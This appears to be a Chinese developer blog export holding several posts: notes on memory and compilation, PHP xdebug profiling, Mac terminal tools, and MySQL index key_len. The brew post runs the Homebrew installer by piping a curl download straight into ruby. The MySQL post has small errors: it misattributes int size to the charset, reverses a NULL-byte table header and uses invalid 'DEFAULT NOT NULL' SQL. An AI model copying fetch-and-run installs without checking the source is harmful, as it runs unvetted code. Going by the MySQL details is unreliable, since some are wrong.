title="指针"></a>指针</h3><p>指针也是一种变量，它所表示的不是数据的值，而是存储着数据的内存的地址。</p><p>通过使用指针，就可以对任意指定地址的数据进行读写。</p><p>数组的定义中所指定的数据类型，也表示一次能够读写的内存大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215650.png" alt=""></p><p>高级编程语言的数组则完全省略了这些概念，直接定义一个数组，就可以放入任意类型的数据（int、float、double、string、object等）。</p><p>指针的概念也是类似，指针的数据类型表示一次可以读写的长度。</p><h3 id="栈、队列及环形缓冲区"><a href="#栈、队列及环形缓冲区" class="headerlink" title="栈、队列及环形缓冲区"></a>栈、队列及环形缓冲区</h3><p>栈的原意是“干草堆积如山”。干草堆积成山后，最后堆的干草会 被最先抽取出来（后进先出）。</p><p>而队列则是完全相反的一种数据结构，先进先出。</p><h2 id="内存和磁盘"><a href="#内存和磁盘" class="headerlink" title="内存和磁盘"></a>内存和磁盘</h2><h3 id="不读入内存就无法运行"><a href="#不读入内存就无法运行" class="headerlink" title="不读入内存就无法运行"></a>不读入内存就无法运行</h3><p>计算机中主要的存储部件是内存和磁盘。磁盘中存储的程序，必须要加载到内存后才能运行。</p><blockquote><p>为什么程序一定要在内存中运行？</p></blockquote><p>这是因为，这是因为负责解析和运行程序内容的CPU，需要通过内部程序计数器来指定内存地址，然后才能读出地址。</p><p>即使CPU 可以直接读出并运行磁盘中保存的程序，由于磁盘读取速度慢，程序的运行速度还是会降低。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215717.png" alt=""></p><p>本文中的所有图片均来自《程序是如何跑起来的》。</p><h3 id="磁盘缓存加速了磁盘访问速度"><a href="#磁盘缓存加速了磁盘访问速度" class="headerlink" title="磁盘缓存加速了磁盘访问速度"></a>磁盘缓存加速了磁盘访问速度</h3><p>磁盘缓存指的是把从磁盘中读取的数据存储到内存中的方式。</p><p>磁盘访问提高访问速度的机制：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215737.png" alt=""></p><h3 id="虚拟内存把磁盘作为部分内存来使用"><a href="#虚拟内存把磁盘作为部分内存来使用" class="headerlink" title="虚拟内存把磁盘作为部分内存来使用"></a>虚拟内存把磁盘作为部分内存来使用</h3><p>虚拟内存是把磁盘作为假象的内存来使用。这与磁盘缓存是假象的磁盘（实际是内存）是相对的，虚拟内存是假象的内存（实际是磁盘）。</p><h2 id="亲自尝试压缩数据"><a href="#亲自尝试压缩数据" class="headerlink" title="亲自尝试压缩数据"></a>亲自尝试压缩数据</h2><p>文件是将数据存储在磁盘等存储媒介中的一种形式，程序文件中存储数据的单位是字节。</p><p>我们把能还原到压缩前状态的压缩称为 <strong>可逆压缩</strong>，无法还原到压 缩前状态的压缩称为 <strong>非可逆压缩</strong>。</p><h2 id="从源文件到可执行文件"><a href="#从源文件到可执行文件" class="headerlink" title="从源文件到可执行文件"></a>从源文件到可执行文件</h2><p>在程序运行时，用来动态申请分配数据和对象的内存区域形式称为<strong>堆</strong>。</p><p>源代码编译 =》本地代码（机器代码）=》dump（每个字节用 2 位十六进制数来表示的方式）</p><p>仅靠编译是无法得到可执行文件的，编译器编译仅仅只是得到了本地文件，为了得到可执行文件，还需要进行”链接“处理。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>在Windows 下，编译后生成的不是 EXE 文件，而是扩展名为<code>.obj</code>的目标文件，在Unix 下，编译后生成的也不是可执行文件，而是扩展名为<code>.o</code> 的目标文件。</p><p>这些文件无法直接运行，这是因为编译过程只是检查语法（函数、变量的声明）是否正确。</p><p>Mac 下编译<code>main.cpp</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c main.cpp</span><br><span class="line">$ ls </span><br><span class="line">main.cpp  main.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>找到所要用到函数所在的目标文件并结合，生成一个可执行文件的处理就是链接，运行连接的程序被称为链接器。</p><p>Mac 下链接<code>main.o</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc main.o -o main</span><br><span class="line">$ main.cpp  main.o  main</span><br></pre></td></tr></table></figure><p>两步可以合并成一步：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc main.cpp</span><br><span class="line">$ ls </span><br><span class="line">main.cpp  a.out</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li><code>main.cpp</code>：源代码文件</li><li><code>main.o</code>：源代码文件编译后生成的本地代码（机器语言）</li><li><code>main</code>：可执行文件</li><li><code>a.out</code>：可执行文件（默认名称）</li></ul><p>当程序加载到内存后，除此之外还会额外生成两个组，那就是<strong>堆</strong>和<strong>栈</strong>。</p><p>栈是用来存储函数内部临时使用的变量（局部变量），以及函数调用时所用的参数的内存区域。<br>堆是用来存储程序运行时的任意数据及对象的内存领域。</p><p>无论是 C 语言还是 C++，如果没有在程序中明确释放堆的内存空间，那么即使在处理完毕后，该内存空间仍会一直残留。这个现象称为 内存泄露。</p><p>编译器和解析器的区别？<br>编译器是在程序运行之前对所有源代码进行解释处理。<br>解析器则是在运行时对源代码的内容一行一行地进行解释处理。</p><h2 id="操作系统和应用的关系"><a href="#操作系统和应用的关系" class="headerlink" title="操作系统和应用的关系"></a>操作系统和应用的关系</h2><p>操作系统本身并不是单独的程序，而是多个程序的集合体。</p><p>初期的操作系统 = 监控程序 + 基本的输入输出程序</p><p>在操作系统这个运行环境下，应用并不能直接控制硬件，而是通过操作系统来间接控制硬件。</p><p>应用程序经过 OS 间接地控制硬件：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210203110747.png" alt=""></p><h3 id="高级语言的可移植性和系统调用"><a href="#高级语言的可移植性和系统调用" class="headerlink" title="高级语言的可移植性和系统调用"></a>高级语言的可移植性和系统调用</h3><p>C 语言等高级编程语言并不依存特定的操作系统。这是因为用高级编程语言编写的应用在编译后，就转换成了利用系统调用的本地代码。</p><p>高级语言编写的函数调用在编译之后变成了系统调用：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210203111420.png" alt=""></p><h2 id="通过汇编语言了解程序的实际构成"><a href="#通过汇编语言了解程序的实际构成" class="headerlink" title="通过汇编语言了解程序的实际构成"></a>通过汇编语言了解程序的实际构成</h2><p>前面的章节已经多次提到了，计算机CPU 能直接解释运行的只有本地代码（机器语言）程序。</p><p>用C 语言等高级编程语言编写的源代码，需要通过各自的编译器编译后，转换成本地代码。</p><p>通过调查本地代码的内容，可以了解程序最终是以何种形式来运行的。但是，如果直接打开本地代码来看的话，只能看到数值的罗列。 如果直接使用这些数值来编写程序的话，还真是不太容易理解。因而 就产生了这样一种想法，那就是在各本地代码中，附带上表示其功能的英语单词缩写。</p><p>例如，在加法运算的本地代码中加上 add(addition 的缩写)、在比较运算的本地代码中加上 cmp(compare 的缩写)等。这些缩写称为 <strong>助记符</strong>，使用助记符的编程语言称为 <strong>汇编语言</strong>。</p><p>不过，即使是用汇编语言编写的源代码，最终也必须转换成本地代码才能运行。负责转换工作的程序称为<strong>汇编器</strong>，转换这一处理本身称为<strong>汇编</strong>。</p><p>用汇编语言编写的源代码，和本地代码是一一对应的。因而，本地代码也可以反过来转换成汇编语言的源代码。持有该功能的逆变换程序称为 <strong>反汇编程序</strong>，逆变换这一处理本身称为<strong>反汇编</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210203160137.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP + xdebug 分析代码性能瓶颈</title>
      <link href="/php-analysis-code-performance-bottleneck/"/>
      <url>/php-analysis-code-performance-bottleneck/</url>
      
        <content type="html"><![CDATA[<p>通常启用了<code>xdebug</code>插件，性能测试输出文件会伴随生成，通常是以<code>cachegrind.out.xxxx</code> 文件存在。</p><a id="more"></a><p>该文件可以通过第三方工具来进行代码性能分析。</p><p>但如果本地有多个项目/网站，所有的profile 都输出到一个文件中了，这样并不方便后面进行性能分析。</p><h3 id="自定义profile-文件名称"><a href="#自定义profile-文件名称" class="headerlink" title="自定义profile 文件名称"></a>自定义profile 文件名称</h3><p>可以通过配置<code>xdebug.profiler_output_name</code> 参数来设置输出文件名称，部分参数如下：</p><table><thead><tr><th>符号</th><th>含义</th><th>配置样例</th><th>样例文件名</th></tr></thead><tbody><tr><td>%c</td><td>当前工作目录的crc32校验值</td><td>cachegrind.out.%c</td><td>cachegrind.out.1258863198</td></tr><tr><td>%p</td><td>当前服务器进程的pid</td><td>cachegrind.out.%p</td><td>cachegrind.out.9685</td></tr><tr><td>%r</td><td>随机数</td><td>cachegrind.out.%r</td><td>cachegrind.out.072db0</td></tr><tr><td>%s</td><td>脚本文件名(注)</td><td>cachegrind.out.%s</td><td>cachegrind.out._home_httpd_html_test_xdebug_test_php</td></tr><tr><td>%t</td><td>Unix时间戳（秒）</td><td>cachegrind.out.%t</td><td>cachegrind.out.1179434742</td></tr><tr><td>%u</td><td>Unix时间戳（微秒）</td><td>cachegrind.out.%u</td><td>cachegrind.out.1179434749_642382</td></tr><tr><td>%H</td><td>$_SERVER[‘HTTP_HOST’]</td><td>cachegrind.out.%H</td><td>cachegrind.out.localhost</td></tr><tr><td>%R</td><td>$_SERVER[‘REQUEST_URI’]</td><td>cachegrind.out.%R</td><td>cachegrind.out._test_xdebug_test_php_var=1_var2</td></tr><tr><td>%S</td><td>session_id (来自$_COOKIE 如果设置了的话)</td><td>cachegrind.out.%S</td><td>cachegrind.out.c70c1ec2375af58f74b390bbdd2a679d</td></tr><tr><td>%%</td><td>%字符</td><td>cachegrind.out.%%</td><td>cachegrind.out.%%</td></tr></tbody></table><p>编辑<code>php.ini</code> 配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.profiler_output_name &#x3D; cachegrind.out.%H</span><br></pre></td></tr></table></figure><p>然后重启 php server。</p><p>在Mac 下，profile 文件存放于<code>/var/tmp/</code>目录中。</p><h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><p>在Mac 下，有MacCallGrind 和 qcachegrind 可以使用，不过前者是收费，直接通过Apple Store下载，后者是免费。需要手动安装。</p><p>安装graphviz，用来Call Graph功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install graphviz</span><br></pre></td></tr></table></figure><p>安装 qcachegrind：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install qcachegrind</span><br></pre></td></tr></table></figure><p>安装完成之后，就可以打开 <code>qcachegrind</code> 应用了，图形界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210119150021.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>不过需要注意，开启了<code>profile</code>文件输出之后，如果本地项目多的话，很容易占用磁盘大面积空间，下图是我半年左右没有清理的状态：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/%E7%A3%81%E7%9B%98.jpg" alt=""></p><p>可以使用命令进行清理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rm -fr &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://xenojoshua.com/2011/05/xdebug-php-profile-output/" target="_blank" rel="noopener">使用xdebug对php进行profile的输出</a></li><li><a href="https://segmentfault.com/a/1190000012395875" target="_blank" rel="noopener">php+xdebug+qcachegrind(mac)性能分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 下有哪些好用的终端工具</title>
      <link href="/what-are-some-useful-terminal-tools-under-Mac/"/>
      <url>/what-are-some-useful-terminal-tools-under-Mac/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记主要是用来整理自己一直在使用的一些较为好用的终端工具/扩展。</p><a id="more"></a><p>因为我个人的终端配置是<code>ZSH</code> + <code>iTerm2</code>，所以本文的部分<code>ZSH</code> 扩展可能不适用于其他<code>Shell</code>用户。</p><h2 id="brew"><a href="#brew" class="headerlink" title="brew"></a>brew</h2><p>经常与终端打交道的用户，对这个一定不陌生，它就是类似<code>Ubuntu</code>下的<code>apt-get</code>这样的包管理工具。</p><p>通常我需要搭建一个全新的开发环境时，它一定是第一个需要安装的工具。</p><p>安装 brew（<a href="https://brew.sh/" target="_blank" rel="noopener">brew 官网</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot;</span><br></pre></td></tr></table></figure><p>常用命令如下：<br>常用命令如下：<br>| 命令 | 描述 |<br>|— | — |<br>|brew search package | 搜索软件包|<br>|brew install package | 安装软件包|<br>|brew uninstall package | 卸载软件包|<br>|brew list | 列出已安装清单|<br>|brew help | 获取帮助|</p><h2 id="OSX-扩展"><a href="#OSX-扩展" class="headerlink" title="OSX 扩展"></a>OSX 扩展</h2><p><code>osx</code> 扩展是<code>zsh</code> 提供的一个控制终端和访达（功能之一）的扩展工具。</p><p>其中最为常用是<code>ofd</code>命令，将当前<code>shell</code>窗口在访达中打开。</p><p>另一个较为常用的命令是<code>cdf</code>，可在<code>shell</code>中直接跳转至当前访达窗口所在的路径（如果存在多个访达窗口，那么跳转至最前面的那个）。</p><p>其他常用命令如下：</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>tab</td><td>在当前目录打开一个新窗口</td></tr><tr><td>split_tab</td><td>在当前窗口打开一个水平窗口</td></tr><tr><td>vsplit_tab</td><td>在当前窗口打开一个垂直窗口</td></tr><tr><td>ofd</td><td>在访达窗口中打开当前目录</td></tr><tr><td>pfd</td><td>返回最前面的访达窗口的路径</td></tr><tr><td>pfs</td><td>返回当前查找程序选择</td></tr><tr><td>cdf</td><td>cd 到当前访达窗口所在的路径</td></tr><tr><td>pushdf</td><td>pushed 到当前访达目录</td></tr><tr><td>quick-look</td><td>快速查看指定文件</td></tr><tr><td>man-preview</td><td>在预览应用程序中打开特定的手册页</td></tr><tr><td>showfiles</td><td>显示隐藏文件</td></tr><tr><td>hidefiles</td><td>隐藏隐藏的文件</td></tr><tr><td>rmdsstore</td><td>以递归方式删除目录中的.DS_Store文件</td></tr></tbody></table><h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p><code>tmux</code> 是一个终端下窗口分割的工具，有关它的具体介绍，请查阅<a href="https://www.0x2beace.com/tmux-quick-start/">这篇笔记</a>。</p><h2 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h2><p>autojump - 目录快速跳转命令行工具，从此告别<code>cd... cd...</code>。</p><p>autojump 是一个<code>Windows</code>、<code>Linux</code>、<code>macOS</code> 都能使用的命令行工具，这是仅介绍<code>macOS</code> 的安装方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install autojump</span><br></pre></td></tr></table></figure><p>使用<code>brew</code>安装完成之后，还需要进行配置，以下方法二选一：</p><ul><li>在 <code>~/.bash_profile</code> 文件中加入语句 <code>[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh</code>。</li><li>在 <code>~/.zshrc</code> 文件中，修改 <code>plugins=(git)</code> 插件配置行，以开启 <code>zsh</code> 对 <code>autojump</code> 插件的支持 <code>plugins=(git autojump)</code>。</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>j foo</td><td>跳转到包含 foo 的目录</td></tr><tr><td>jc bar</td><td>跳转到包含 bar 的子目录</td></tr><tr><td>jo file</td><td>在访达中打开包含 file 的目录</td></tr><tr><td>autojump –help</td><td>打开帮助列表</td></tr></tbody></table><h2 id="Spaceship-ZSH"><a href="#Spaceship-ZSH" class="headerlink" title="Spaceship ZSH"></a>Spaceship ZSH</h2><p>Spaceship ZSH——是一个极简、强大和可定制的<code>ZSH</code>提示符。</p><p>我是在无意间发现的这个终端工具的，先来看一下实际效果。</p><p><img src="https://user-images.githubusercontent.com/10276208/36086434-5de52ace-0ff2-11e8-8299-c67f9ab4e9bd.gif" alt="image"></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>Spaceship ZSH 有很多很棒的特点，这里仅仅列举一些我所看见的。</p><ul><li>颜值即正义</li><li>展示当前Git 仓库的状态</li><li>展示各种语言的当前版本</li><li>展示最后一条命令的总执行时间</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Spaceship ZSH 的安装方式有多种，这里仅介绍通过<code>oh-my-zsh</code>的安装方式，其他方式可参考<a href="https://denysdovhan.com/spaceship-prompt/" target="_blank" rel="noopener">官网</a>。</p><ol><li>克隆仓库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot;</span><br></pre></td></tr></table></figure></li><li>将<code>spaceship.zsh-theme</code> 链接到<code>oh-my-zsh</code> 的主题目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh-theme&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot;</span><br></pre></td></tr></table></figure></li><li>编辑<code>~/.zshrc</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME&#x3D;&quot;spaceship&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>tldr 是一个比man 更好用的命令行手册。</p><p>它衍生出了各种语言的客户端，这里直接使用官网推荐的方式进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g tldr</span><br></pre></td></tr></table></figure><p>安装完成之后，第一次使用<code>tldr</code>命令需要下载相关依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tldr tar</span><br><span class="line">Page not found. Updating cache...</span><br><span class="line">Error: connect ECONNREFUSED 127.0.0.1:443</span><br></pre></td></tr></table></figure><p>如果出现上面这个输出，表示命令行需要使用代理，如果不知道如何设置，可以参考<a href="https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/">这篇笔记</a>。</p><p>正常输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tldr tar</span><br><span class="line">✔ Page not found. Updating cache...</span><br><span class="line">✔ Creating index...</span><br><span class="line"></span><br><span class="line">  tar</span><br><span class="line"></span><br><span class="line">  Archiving utility.</span><br><span class="line">  Often combined with a compression method, such as gzip or bzip.</span><br><span class="line">  More information: https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;tar.</span><br><span class="line"></span><br><span class="line">  - [c]reate an archive from [f]iles:</span><br><span class="line">    tar cf target.tar file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - [c]reate a g[z]ipped archive from [f]iles:</span><br><span class="line">    tar czf target.tar.gz file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - [c]reate a g[z]ipped archive from a directory using relative paths:</span><br><span class="line">    tar czf target.tar.gz --directory&#x3D;path&#x2F;to&#x2F;directory .</span><br><span class="line"></span><br><span class="line">  - E[x]tract a (compressed) archive [f]ile into the current directory:</span><br><span class="line">    tar xf source.tar[.gz|.bz2|.xz]</span><br><span class="line"></span><br><span class="line">  - E[x]tract a (compressed) archive [f]ile into the target directory:</span><br><span class="line">    tar xf source.tar[.gz|.bz2|.xz] --directory&#x3D;directory</span><br><span class="line"></span><br><span class="line">  - [c]reate a compressed archive from [f]iles, using [a]rchive suffix to determine the compression program:</span><br><span class="line">    tar caf target.tar.xz file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - Lis[t] the contents of a tar [f]ile [v]erbosely:</span><br><span class="line">    tar tvf source.tar</span><br><span class="line"></span><br><span class="line">  - E[x]tract [f]iles matching a pattern:</span><br><span class="line">    tar xf source.tar --wildcards &quot;*.html&quot;</span><br></pre></td></tr></table></figure><p>上面那个node 的客户端不是交互式的，如果需要自动的，可以使用 <a href="https://github.com/isacikgoz/tldr" target="_blank" rel="noopener">tldr++</a>，这是一个Go 语言编写的交互式客户端。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener">安装 zsh</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins" target="_blank" rel="noopener">如何启用 zsh 的插件</a></li><li><a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/plugins/osx" target="_blank" rel="noopener">OSX 插件</a></li><li><a href="https://github.com/denysdovhan/spaceship-prompt#installing" target="_blank" rel="noopener">Spaceship ZSH</a></li><li><a href="https://github.com/wting/autojump" target="_blank" rel="noopener">autojump——自动跳转文件目录</a></li><li><a href="https://github.com/tldr-pages/tldr" target="_blank" rel="noopener">tldr——比man 更好用的命令行手册</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 索引设计与优化</title>
      <link href="/mysql-index-design-and-optimization/"/>
      <url>/mysql-index-design-and-optimization/</url>
      
        <content type="html"><![CDATA[<p>什么是索引？</p><a id="more"></a><blockquote><p>数据库索引是一种数据结构，它以额外的写入和存储空间为代价来提高数据库表上数据检索操作的速度。通俗来说，索引类似于书的目录，根据其中记录的页码可以快速找到所需的内容。——维基百科</p></blockquote><p>常见索引有哪些？</p><ul><li>普通索引：最基本的索引，没有任何限制</li><li>唯一索引：与”普通索引“类似，不同的就是：索引列的值必须是唯一，但允许有空值</li><li>主键索引：它是一种特殊的索引，不允许有空值</li><li>全文索引：仅可用于 MyISAM 表，针对较大的数据，生成全文索引很耗时占空间</li><li>组合索引：为了提高多条件查询效率，可建立组合索引，遵循”最左前缀匹配原则“</li></ul><p>这里以相对复杂的组合为例，介绍如何优化。</p><h2 id="最左前缀匹配原则"><a href="#最左前缀匹配原则" class="headerlink" title="最左前缀匹配原则"></a>最左前缀匹配原则</h2><p>首先我们要知道什么是最左前缀匹配原则。</p><p>最左前缀匹配原则是指在使用 B+Tree 联合索引进行数据检索时，MySQL 优化器会读取谓词（过滤条件）<strong>并按照联合索引字段创建顺序一直向右匹配直到遇到范围查询或非等值查询后停止匹配</strong>，此字段之后的索引列不会被使用，这时计算 <code>key_len</code> 可以分析出联合索引实际使用了哪些索引列。</p><h3 id="如何计算-key-len"><a href="#如何计算-key-len" class="headerlink" title="如何计算 key_len"></a>如何计算 key_len</h3><p>通过 <code>key_len</code> 计算也帮助我们了解索引的最左前缀匹配原则。</p><p><code>key_len</code> 表示得到结果集所使用的选择索引的长度[字节数]，不包括 <code>order by</code>，也就是说如果 <code>order by</code> 也使用了索引则 <code>key_len</code> 不计算在内。</p><p>在计算 <code>key_len</code> 之前，先来温习一下基本数据类型（以UTF8 编码为例）：<br>|类型|所占空间|不允许为NULL额外占用|<br>|-|-|-|<br>|char|一个字符三个字节|一个字节|<br>|varchar|一个字符三个字节|一个字节|<br>|int|四个字节|一个字节|<br>|tinyint|一个字节|一个字节|</p><p>测试数据表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;test_table&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;a&#96; int(11) DEFAULT NOT NULL,</span><br><span class="line">  &#96;b&#96; int(11) DEFAULT NOT NULL,</span><br><span class="line">  &#96;c&#96; int(11) DEFAULT NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;test_table_a_b_c_index&#96; (&#96;a&#96;,&#96;b&#96;,&#96;c&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><p>命中索引：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">| id | select_type | table      | partitions | type | possible_keys          | key                    | key_len | ref               | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | test_table | NULL       | ref  | test_table_a_b_c_index | test_table_a_b_c_index | 12      | const,const,const |    1 |   100.00 | Using index |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br></pre></td></tr></table></figure><p>可以看到 <code>key_len = 12</code>，这是如何计算的呢？<br>因为字符集是 UTF8，一个字段占用四个字节，三个字段就是 4 * 3 = 12 字节。</p><p>是否允许为 NULL，如果允许为 NULL，则需要用额外的字节来标记该字段，不同的数据类型所需的字节大小不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;a&#96; &#96;a&#96; INT(11)  NULL;</span><br><span class="line">mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;c&#96; &#96;c&#96; INT(11)  NULL;</span><br><span class="line">mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;b&#96; &#96;b&#96; INT(11)  NULL;</span><br><span class="line">mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">| id | select_type | table      | partitions | type | possible_keys          | key                    | key_len | ref               | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | test_table | NULL       | ref  | test_table_a_b_c_index | test_table_a_b_c_index | 15      | const,const,const |    1 |   100.00 | Using index |</span><br><span class="line">+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+</span><br></pre></td></tr></table></figure><p>可以看到，当字段允许为空时，这时的<code>key_len</code> 变成了15 = 4 * 3 + 1 * 3（INT 类型为空时，额外占用一个字节）。</p><h2 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h2><p>有了这些基础知识之后，再来根据实际的SQL 判断索性性能好坏。</p><p>还是以上面那张数据表为例，为 a、b、c 三个字段创建联合索引。<br>|SQL 